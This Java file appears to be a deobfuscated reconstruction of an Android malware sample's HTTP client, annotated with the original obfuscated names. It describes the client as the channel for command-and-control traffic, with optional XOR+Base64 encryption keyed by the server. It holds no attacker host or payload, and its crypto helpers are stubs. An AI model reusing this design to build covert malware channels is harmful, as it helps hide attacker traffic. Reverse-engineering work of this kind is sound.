package api;

import android.util.Base64;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import model.Jsonable;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * HttpClient — HTTP 传输层
 *
 * Original: IlIllIlllIllI1.lIIIIlllllIlll1
 *
 * Low-level HTTP client used by ApiClient for all C&C communication.
 * Handles JSON serialization, optional XOR+Base64 request/response encryption,
 * HTTP headers, and error handling.
 *
 * Features:
 *   - POST/GET/PUT/DELETE support (enum-based)
 *   - 15-second connect and read timeout
 *   - JSON request body serialization via Jsonable.toJSONObject()
 *   - Optional XOR encryption of request body and response body
 *   - Standard HTTP headers: Content-Type, Accept, User-Agent
 *   - Threaded execution via cached thread pool
 *
 * ┌──────────────────────────────────────────────────────────────┐
 * │ Constants                                                    │
 * ├──────────────────────────────────────────────────────────────┤
 * │ CONNECT_TIMEOUT = 15000 ms                                  │
 * │ READ_TIMEOUT    = 15000 ms                                  │
 * │ LOG_TAG         = "HttpClient"                              │
 * └──────────────────────────────────────────────────────────────┘
 *
 * Encryption flow:
 *   Request:  body JSON → XOR(bytes, encryptionKey) → Base64 encode → send
 *   Response: receive → Base64 decode → XOR(bytes, encryptionKey) → JSON parse
 *   If encryptionKey is null, no encryption is applied.
 */
public class HttpClient {

    /** Connect timeout in milliseconds */
    public static final int CONNECT_TIMEOUT = 15000;                   /* f232lIIIIlllllIlll1 */

    /** Read timeout in milliseconds */
    public static final int READ_TIMEOUT = 15000;                      /* f234llllIllIl1 */

    /** Log tag for HTTP operations */
    public static final String LOG_TAG = "HttpClient";                 /* f233llllIIIIll1 */

    /** Cached thread pool for async HTTP requests */
    public static final ExecutorService EXECUTOR = Executors.newCachedThreadPool();
                                                                        /* f231IllIIlIIII1 */

    /** XOR encryption key (set dynamically from C&C response) */
    public static byte[] encryptionKey = null;                         /* f230IlIlllIIlI1 */

    // =========================================================================
    // HTTP Method Enum
    // =========================================================================

    /**
     * HTTP methods supported by the client.
     *
     * Original enum: EnumC0007lIIIIlllllIlll1
     * Values: GET(0), POST(1), PUT(2), DELETE(3)
     *
     * Note: JADX failed to restore the enum due to external variable init.
     * The enum names were decrypted from XOR strings.
     */
    public enum Method {
        GET,        /* f238llllIIIIll1 — ordinal 0 */
        POST,       /* f237lIIIIlllllIlll1 — ordinal 1 */
        PUT,        /* f239llllIllIl1 — ordinal 2 */
        DELETE      /* f236IllIIlIIII1 — ordinal 3 */
    }

    // =========================================================================
    // Response Parser Interface
    // =========================================================================

    /**
     * Functional interface for parsing a JSONObject into a typed response.
     *
     * Original: llllIllIl1<T>
     */
    public interface ResponseParser<T> {
        T parse(JSONObject json) throws JSONException;
    }

    // =========================================================================
    // Exception
    // =========================================================================

    /**
     * HTTP client exception wrapping network/API errors.
     *
     * Original: llllIIIIll1 (inner class)
     */
    public static class HttpClientException extends Exception {
        public final int statusCode;        /* f241llllIIIIll1 */
        public final String responseBody;   /* f240lIIIIlllllIlll1 */

        public HttpClientException(String message) {
            super(message);
            this.statusCode = 0;
            this.responseBody = "";
        }

        public HttpClientException(String message, Throwable cause) {
            super(message, cause);
            this.statusCode = 0;
            this.responseBody = "";
        }

        public HttpClientException(String message, int statusCode, String responseBody) {
            super(message);
            this.statusCode = statusCode;
            this.responseBody = responseBody;
        }
    }

    // =========================================================================
    // Core HTTP Methods
    // =========================================================================

    /**
     * Sets the XOR encryption key (from Base64-encoded string).
     *
     * Original: llllIIIIll1(String str) [void]
     * @param base64Key Base64-encoded encryption key
     */
    public static void setEncryptionKey(String base64Key) {
        encryptionKey = Base64.decode(base64Key, Base64.NO_WRAP);
    }

    /**
     * Sends an HTTP request (without extra headers).
     *
     * Original: llllIIIIll1(str, enum, body, parser) — 4-arg overload
     */
    public static <T extends Jsonable, R extends Jsonable> T post(
            String url, Method method, R body, ResponseParser<T> parser)
            throws HttpClientException {
        return post(url, method, body, parser, null);
    }

    /**
     * Sends an HTTP request with optional extra headers.
     *
     * Original: llllIIIIll1(str, enum, body, parser, map) — 5-arg overload
     *
     * Flow:
     *   1. Open HttpURLConnection
     *   2. Set method, timeouts, headers
     *   3. If POST/PUT with body: serialize to JSON, optionally XOR+Base64 encrypt
     *   4. Write body to output stream
     *   5. Read response: if 2xx, parse; otherwise throw HttpClientException
     *   6. Optionally XOR+Base64 decrypt response
     *   7. Parse JSON response via parser
     *
     * @param url    the URL to connect to
     * @param method HTTP method
     * @param body   request body (Jsonable), or null
     * @param parser response parser
     * @param headers extra headers, or null
     * @return parsed response object
     * @throws HttpClientException on HTTP/network/parse errors
     */
    public static <T extends Jsonable, R extends Jsonable> T post(
            String url, Method method, R body, ResponseParser<T> parser,
            Map<String, String> headers) throws HttpClientException {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod(method.name());
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            conn.setReadTimeout(READ_TIMEOUT);
            setDefaultHeaders(conn, headers);

            // Write request body for POST/PUT
            if (body != null && (method == Method.POST || method == Method.PUT)) {
                conn.setDoOutput(true);
                String jsonBody = body.toJSONObject().toString();

                LogHelper.debug(LOG_TAG, "[url]: " + url + " [request]: " + jsonBody);

                // Optionally encrypt the body
                if (encryptionKey != null) {
                    jsonBody = new String(Base64.encode(
                            XorHelper.xor(jsonBody.getBytes(StandardCharsets.UTF_8), encryptionKey),
                            Base64.NO_WRAP));
                }

                LogHelper.debug(LOG_TAG, "[url]: " + url + " [encrypted]: " + jsonBody);
                writeBody(conn, jsonBody);
            }

            int responseCode = conn.getResponseCode();
            if (responseCode >= 200 && responseCode <= 299) {
                String responseStr = readStream(conn.getInputStream());
                LogHelper.debug("response: " + responseStr);

                // Optionally decrypt the response
                if (encryptionKey != null) {
                    String decrypted = new String(
                            XorHelper.xorDecrypt(
                                    Base64.decode(responseStr, Base64.NO_WRAP),
                                    encryptionKey));
                    LogHelper.debug(LOG_TAG,
                            "[url]: " + url + " [response]: " + decrypted);
                    T result = parser.parse(new JSONObject(decrypted));
                    conn.disconnect();
                    return result;
                }

                T result = parser.parse(new JSONObject(responseStr));
                conn.disconnect();
                return result;
            }

            throw new HttpClientException(
                    "HTTP错误：" + responseCode,
                    responseCode,
                    readStream(conn.getErrorStream()));

        } catch (IOException e) {
            throw new HttpClientException("网络错误: " + e.getMessage(), e);
        } catch (Exception e) {
            if (e instanceof HttpClientException) throw (HttpClientException) e;
            throw new HttpClientException("JSON转换错误: " + e.getMessage(), e);
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    // =========================================================================
    // Helper Methods
    // =========================================================================

    /**
     * Sets default HTTP headers on the connection.
     *
     * Original: llllIIIIll1(HttpURLConnection, Map)
     */
    private static void setDefaultHeaders(HttpURLConnection conn, Map<String, String> extras) {
        conn.setUseCaches(false);
        conn.setDoInput(true);
        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
        conn.setRequestProperty("Accept", "application/json");
        conn.setRequestProperty("User-Agent",
                core.PreferencesHelper.buildUserAgent());
        if (extras != null) {
            for (Map.Entry<String, String> entry : extras.entrySet()) {
                conn.setRequestProperty(entry.getKey(), entry.getValue());
            }
        }
    }

    /**
     * Writes a string body to the connection's output stream.
     *
     * Original: llllIIIIll1(HttpURLConnection, String)
     */
    private static void writeBody(HttpURLConnection conn, String body) throws IOException {
        OutputStream os = conn.getOutputStream();
        try {
            BufferedWriter writer = new BufferedWriter(
                    new OutputStreamWriter(os, StandardCharsets.UTF_8));
            try {
                writer.write(body);
                writer.flush();
                writer.close();
            } finally {
                writer.close();
            }
            os.close();
        } catch (Throwable th) {
            if (os != null) {
                try { os.close(); } catch (Throwable t) { th.addSuppressed(t); }
            }
            throw th;
        }
    }

    /**
     * Reads an InputStream into a String (UTF-8).
     *
     * Original: lIIIIlllllIlll1(InputStream) [returns String]
     */
    public static String readStream(InputStream inputStream) throws IOException {
        if (inputStream == null) return "";
        StringBuilder sb = new StringBuilder();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(inputStream, StandardCharsets.UTF_8));
        try {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            reader.close();
            return sb.toString();
        } catch (Throwable th) {
            try { reader.close(); } catch (Throwable t) { th.addSuppressed(t); }
            throw th;
        }
    }

    /**
     * Reads an InputStream into a byte array (up to 1MB chunks).
     *
     * Original: llllIIIIll1(InputStream) [returns byte[]]
     */
    public static byte[] readBytes(InputStream inputStream) throws IOException {
        byte[] buffer = new byte[1048576]; // 1MB
        byte[] result = null;
        int read;
        while ((read = inputStream.read(buffer)) > 0) {
            if (result == null) {
                result = new byte[read];
                System.arraycopy(buffer, 0, result, 0, read);
            } else {
                int oldLen = result.length;
                byte[] newResult = new byte[oldLen + read];
                System.arraycopy(result, 0, newResult, 0, oldLen);
                System.arraycopy(buffer, 0, newResult, oldLen, read);
                result = newResult;
            }
        }
        return result != null ? result : new byte[0];
    }

    // =========================================================================
    // Placeholder types
    // =========================================================================

    /*
     * LogHelper → lllllIllIl1.IllIIlIIII1
     *   - static void debug(String tag, String msg)
     *   - static void debug(String msg)
     *
     * XorHelper → IlIlIIIlIlIlll1.lIIIIlllllIlll1
     *   - static byte[] xor(byte[] data, byte[] key)      — encrypt
     *   - static byte[] xorDecrypt(byte[] data, byte[] key) — decrypt (same operation)
     */
    static class LogHelper {
        static void debug(String tag, String msg) {}
        static void debug(String msg) {}
    }

    static class XorHelper {
        static byte[] xor(byte[] data, byte[] key) { return data; }
        static byte[] xorDecrypt(byte[] data, byte[] key) { return data; }
    }
}
